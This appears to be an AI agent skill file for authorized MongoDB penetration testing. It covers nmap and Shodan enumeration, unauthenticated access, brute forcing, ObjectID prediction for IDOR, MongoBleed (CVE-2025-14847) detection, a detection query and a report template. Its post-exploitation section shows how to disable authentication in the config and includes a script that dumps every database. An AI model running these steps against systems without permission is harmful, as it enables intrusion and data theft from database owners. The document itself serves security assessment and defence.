---
name: mongodb-pentest
description: Security assessment and penetration testing for MongoDB databases. Use this skill whenever the user needs to enumerate MongoDB instances, test for authentication bypass, check for ObjectID prediction vulnerabilities, assess MongoBleed (CVE-2025-14847) exposure, or perform authorized security testing on MongoDB services on ports 27017/27018. Trigger for any MongoDB security assessment, vulnerability scanning, or penetration testing task.
---

# MongoDB Security Assessment Skill

A comprehensive skill for authorized MongoDB penetration testing and security assessment.

## ⚠️ Authorization Required

**Only use these techniques on systems you own or have explicit written authorization to test.** Unauthorized access to databases is illegal.

## Quick Start

```bash
# Basic enumeration
nmap -sV --script "mongo* and default" -p 27017 <target>

# Check for authentication requirements
nmap -n -sV --script mongodb-brute -p 27017 <target>

# Test MongoBleed exposure (detection only)
python3 scripts/mongobleed_detect.py --host <target>
```

## Workflow Overview

1. **Enumeration** - Discover MongoDB instances and gather information
2. **Authentication Testing** - Check for default/no-auth access
3. **Vulnerability Assessment** - Test for known vulnerabilities
4. **Data Access Testing** - Verify what data is accessible
5. **Reporting** - Document findings

---

## 1. Enumeration

### Manual Enumeration with Python

Use the `scripts/mongodb_enum.py` script for comprehensive enumeration:

```bash
# Basic server info
python3 scripts/mongodb_enum.py --host <target> --port 27017 --info

# List all databases and collections
python3 scripts/mongodb_enum.py --host <target> --port 27017 --list-dbs

# Full enumeration (requires auth if enabled)
python3 scripts/mongodb_enum.py --host <target> --port 27017 --full
```

### Manual Python Connection

```python
from pymongo import MongoClient

# Connect without auth (common default)
client = MongoClient('mongodb://<host>:<port>/')

# Get basic server info
print(client.server_info())

# If admin access available
admin = client.admin
admin_info = admin.command("serverStatus")

# List all databases
cursor = client.list_databases()
for db in cursor:
    print(f"Database: {db['name']}")
    print(f"Collections: {client[db['name']].list_collection_names()}")
```

### MongoDB Shell Commands

```bash
# Connect to MongoDB
mongo <HOST>:<PORT>/<DB>
mongo <database> -u <username> -p '<password>'

# Navigation commands
show dbs                    # List all databases
use <db>                    # Select database
show collections            # List collections in current DB

# Query commands
db.<collection>.find()      # Dump all documents
db.<collection>.count()     # Count records
db.current.find({"username":"admin"})  # Find specific documents
```

### Nmap Enumeration

```bash
# All MongoDB scripts
nmap -sV --script "mongo*" -p 27017 <target>

# Default configuration check
nmap -sV --script "mongo* and default" -p 27017 <target>

# Brute force check
nmap -n -sV --script mongodb-brute -p 27017 <target>
```

### Shodan Reconnaissance

```bash
# All MongoDB servers
"mongodb server information"

# Fully open (no auth)
"mongodb server information" -"partially enabled"

# Partially enabled auth
"mongodb server information" "partially enabled"
```

---

## 2. Authentication Testing

### Check for No-Auth Access

MongoDB often runs without authentication by default:

```bash
# Try connecting without credentials
mongo <HOST>:<PORT>

# If successful, you have unauthenticated access
show dbs
```

### Check Configuration Files

If you have filesystem access, check the MongoDB config:

```bash
# Check if authentication is disabled
grep "noauth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#"

# Check if authentication is enabled
grep "auth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#\|noauth"
```

### Brute Force Testing

```bash
# Nmap brute force script
nmap -n -sV --script mongodb-brute -p 27017 <target>

# With wordlist
nmap -n -sV --script mongodb-brute --script-args userdb=users.txt,passdb=pass.txt -p 27017 <target>
```

---

## 3. ObjectID Prediction (IDOR Testing)

MongoDB ObjectIDs are 12-byte hexadecimal strings with predictable structure:

```
5f2459ac9fa6dc2500314019
││││││││││││││││││││││││
│││││││││││││││││││││└─ Counter (3 bytes)
│││││││││││││││││││└──── Process ID (2 bytes)
││││││││││││││││└─────── Machine ID (3 bytes)
│││││││││││││└────────── Timestamp (4 bytes)
```

### ObjectID Structure

1. **Timestamp** (4 bytes): Unix timestamp in seconds
2. **Machine ID** (3 bytes): Unique identifier for the machine
3. **Process ID** (2 bytes): MongoDB process ID
4. **Counter** (3 bytes): Incremental counter

### Testing for IDOR

Use the `scripts/objectid_predict.py` script:

```bash
# Generate predictable ObjectIDs from a known ID
python3 scripts/objectid_predict.py --base-id 5f2459ac9fa6dc2500314019 --count 1000

# Test against a target endpoint
python3 scripts/objectid_predict.py --base-id 5f2459ac9fa6dc2500314019 --test-url "https://api.example.com/user/{id}"
```

### Manual Testing Approach

1. Create an account and capture the ObjectID
2. Use the prediction tool to generate ~1000 probable IDs
3. Test each ID against the target endpoint
4. Look for valid responses indicating IDOR vulnerability

---

## 4. MongoBleed (CVE-2025-14847) Assessment

### Vulnerability Overview

MongoBleed is a memory disclosure vulnerability affecting MongoDB 3.6–8.2 when zlib compression is enabled. It allows unauthenticated attackers to read uninitialized heap memory.

### Affected Versions

- 3.6.x (all)
- 4.0.x (all)
- 4.2.x (all)
- 4.4.0–4.4.29
- 5.0.0–5.0.31
- 6.0.0–6.0.26
- 7.0.0–7.0.27
- 8.0.0–8.0.16
- 8.2.0–8.2.2

### Detection Script

```bash
# Check if target is potentially vulnerable
python3 scripts/mongobleed_detect.py --host <target> --port 27017

# Full detection with version check
python3 scripts/mongobleed_detect.py --host <target> --port 27017 --check-version
```

### Manual Detection

```javascript
// Check if zlib compression is enabled
db.adminCommand({getParameter: 1, networkMessageCompressors: 1})

// If response includes "zlib", the server may be vulnerable
```

### Exposure Requirements

1. Server version in vulnerable range
2. `zlib` compression enabled in `net.compression.compressors`
3. Network access to MongoDB port (27017/27018)
4. No authentication required for exploitation

---

## 5. Post-Exploitation

### If Root Access is Available

```bash
# Modify MongoDB config to disable authentication
echo "noauth = true" >> /etc/mongod.conf

# Restart MongoDB
systemctl restart mongod

# Now connect without credentials
mongo localhost:27017
```

### Data Exfiltration

```python
from pymongo import MongoClient
import json

client = MongoClient('mongodb://<host>:<port>/')

# Dump all databases
for db_name in client.list_database_names():
    db = client[db_name]
    for collection_name in db.list_collection_names():
        collection = db[collection_name]
        data = list(collection.find())
        # Save to file
        with open(f"{db_name}_{collection_name}.json", "w") as f:
            json.dump(data, f, indent=2, default=str)
```

---

## 6. Detection & Monitoring

### Server-Side Detection

Watch for high-velocity connections (potential MongoBleed probing):

```sql
-- Cortex XQL query for high-velocity MongoDB connections
dataset = xdr_data
| filter event_type = ENUM.NETWORK
| filter lowercase(actor_process_image_name) in ("mongod", "mongod.exe")
| filter action_network_is_server = true
| filter action_remote_ip not in (null, "")
| filter incidr(action_remote_ip, "10.0.0.0/8") != true and
        incidr(action_remote_ip, "192.168.0.0/16") != true and
        incidr(action_remote_ip, "172.16.0.0/12") != true
| filter action_network_session_duration <= 5000
| bin _time span = 1m
| comp count(_time) as Counter by agent_hostname, action_remote_ip, _time
| filter Counter >= 500
```

### Indicators of Compromise

- Spikes in inbound connections to mongod
- Short-lived connections from single IPs
- Unusual query patterns
- Failed authentication attempts

---

## Reporting Template

```markdown
# MongoDB Security Assessment Report

## Target Information
- Host: <target>
- Port: 27017/27018
- Version: <detected version>

## Findings

### Authentication
- [ ] No authentication required
- [ ] Weak credentials found
- [ ] Brute force vulnerable

### Vulnerabilities
- [ ] MongoBleed (CVE-2025-14847) - <status>
- [ ] ObjectID prediction - <status>
- [ ] Default configuration - <status>

### Data Exposure
- Databases accessible: <count>
- Collections accessible: <count>
- Sensitive data found: <yes/no>

## Recommendations
1. Enable authentication
2. Update MongoDB to latest version
3. Disable zlib compression if not needed
4. Implement network segmentation
5. Enable monitoring and alerting
```

---

## References

- [MongoDB Security Documentation](https://www.mongodb.com/docs/manual/security/)
- [CVE-2025-14847 (MongoBleed)](https://jira.mongodb.org/browse/SERVER-115508)
- [MongoDB ObjectID Specification](https://www.mongodb.com/docs/manual/reference/method/ObjectId/)
- [Unit 42 – MongoBleed Threat Brief](https://unit42.paloaltonetworks.com/mongobleed-cve-2025-14847/)
- [MongoBleed PoC](https://github.com/joe-desimone/mongobleed)
